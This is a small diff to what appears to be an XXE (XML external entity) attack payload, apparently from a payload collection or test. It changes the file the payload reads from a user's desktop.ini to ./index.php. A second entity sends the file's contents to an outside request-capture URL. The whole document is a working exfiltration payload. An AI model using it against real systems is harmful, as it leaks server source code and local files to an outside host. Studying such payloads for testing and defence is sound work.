@@ -1,7 +1,7 @@
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY % data SYSTEM "file:///C:\Users\Peter\Documents\desktop.ini">
+<!ENTITY % data SYSTEM "file:///./index.php">
 <!ENTITY exfil SYSTEM "http://requestb.in/1ayyz3l1?%data;">
 ]>
 <r>&exfil;</r>
